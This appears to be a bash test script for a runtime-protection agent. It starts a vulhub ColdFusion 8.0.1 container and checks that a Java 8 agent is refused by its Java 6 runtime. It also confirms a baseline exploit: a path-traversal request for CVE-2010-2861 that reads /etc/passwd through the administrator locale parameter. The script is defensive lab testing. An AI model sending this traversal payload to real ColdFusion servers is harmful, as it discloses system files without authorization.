#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_COLDFUSION_2861_IMAGE:-vulhub/coldfusion:8.0.1}"
baseline_name="${OHMYRASP_VULHUB_COLDFUSION_2861_BASELINE_NAME:-ohmyrasp-coldfusion2861-baseline}"
baseline_port="${OHMYRASP_VULHUB_COLDFUSION_2861_BASELINE_PORT:-19660}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-coldfusion-8.0.1-2861-java6-baseline"
protected_dir="logs/vulhub-coldfusion-8.0.1-2861-java6-protected"
gradle_cache_dir=""

copy_artifacts() {
  mkdir -p "$baseline_dir"
  if docker inspect "$baseline_name" >/dev/null 2>&1; then
    docker logs "$baseline_name" > "${baseline_dir}/container.log" 2>&1 || true
    docker exec "$baseline_name" sh -lc \
      'tail -n 200 /opt/coldfusion8/logs/cfserver.log 2>/dev/null || true; echo "---"; tail -n 200 /opt/coldfusion8/logs/exception.log 2>/dev/null || true' \
      > "${baseline_dir}/coldfusion-logs.txt" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts
  docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true
  if [[ -n "${gradle_cache_dir:-}" ]]; then
    rm -rf "${gradle_cache_dir}" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 60 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

build_java8_agent() {
  gradle_cache_dir="$(mktemp -d "${TMPDIR:-/tmp}/ohmyrasp-gradle-cache-coldfusion2861.XXXXXX")"
  docker run --rm -u "$(id -u):$(id -g)"   -e HOME=/tmp/gradle-home \
    -e GRADLE_USER_HOME=/tmp/gradle-cache \
    -v "${gradle_cache_dir}:/tmp/gradle-cache" \
    -v "$(pwd):/workspace" \
    -w /workspace \
    gradle:jdk25 \
    gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null
}

verify_java6_boundary() {
  docker run --rm --entrypoint sh "$image" -lc \
    '/opt/coldfusion8/runtime/jre/bin/java -version' \
    > "${protected_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq 'java version "1.6.0_04"' "${protected_dir}/image-java-version.txt"; then
    cat "${protected_dir}/image-java-version.txt" >&2 || true
    echo "ColdFusion CVE-2010-2861 image did not report the expected Java 6 runtime" >&2
    exit 1
  fi

  set +e
  docker run --rm --entrypoint sh \
    -v "${host_agent_jar}:/tmp/ohmyrasp-agent-java8.jar:ro" \
    "$image" -lc \
    '/opt/coldfusion8/runtime/jre/bin/java -javaagent:/tmp/ohmyrasp-agent-java8.jar -version' \
    > "${protected_dir}/java8-agent-on-java6.log" 2>&1
  local status="$?"
  set -e
  printf 'java8_agent_on_java6_status=%s\n' "$status" > "${protected_dir}/attempts.log"
  if ! grep -Fq 'Unsupported major.minor version 52.0' "${protected_dir}/java8-agent-on-java6.log"; then
    cat "${protected_dir}/java8-agent-on-java6.log" >&2 || true
    echo "Java 6 ColdFusion did not reject the Java 8 agent with the expected class-version error" >&2
    exit 1
  fi
}

start_baseline() {
  docker run -d --name "$baseline_name" \
    -p "${baseline_port}:8500" \
    "$image" >/dev/null
}

wait_for_admin() {
  local status
  for attempt in $(seq 1 240); do
    status="$(curl_status "${baseline_dir}/ready-${attempt}.html" \
      "http://127.0.0.1:${baseline_port}/CFIDE/administrator/enter.cfm")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${baseline_dir}/attempts.log"
    if [[ "$status" == "200" ]]; then
      cp "${baseline_dir}/ready-${attempt}.html" "${baseline_dir}/administrator-enter.html"
      return
    fi
    if ! docker ps --filter "name=${baseline_name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$baseline_name"; then
      docker logs "$baseline_name" >&2 || true
      echo "ColdFusion baseline container stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done

  docker logs "$baseline_name" >&2 || true
  echo "ColdFusion baseline did not become ready on ${baseline_port}" >&2
  exit 1
}

wait_for_passwd_disclosure() {
  local status
  local url="http://127.0.0.1:${baseline_port}/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en"
  for attempt in $(seq 1 60); do
    status="$(curl_status "${baseline_dir}/passwd-${attempt}.html" "$url")"
    printf 'passwd_attempt=%s status=%s\n' "$attempt" "$status" >> "${baseline_dir}/attempts.log"
    if [[ "$status" == "200" ]] && grep -Fq 'root:x:0:0:' "${baseline_dir}/passwd-${attempt}.html"; then
      cp "${baseline_dir}/passwd-${attempt}.html" "${baseline_dir}/passwd-disclosure.html"
      return
    fi
    sleep 2
  done

  docker logs "$baseline_name" >&2 || true
  echo "baseline ColdFusion CVE-2010-2861 did not disclose /etc/passwd" >&2
  exit 1
}

build_java8_agent

rm -rf "$baseline_dir" "$protected_dir"
mkdir -p "$baseline_dir" "$protected_dir"
docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true

verify_java6_boundary
start_baseline
wait_for_admin
wait_for_passwd_disclosure
copy_artifacts
docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true

echo "vulhub ColdFusion 8.0.1 CVE-2010-2861 Java6 legacy boundary passed"
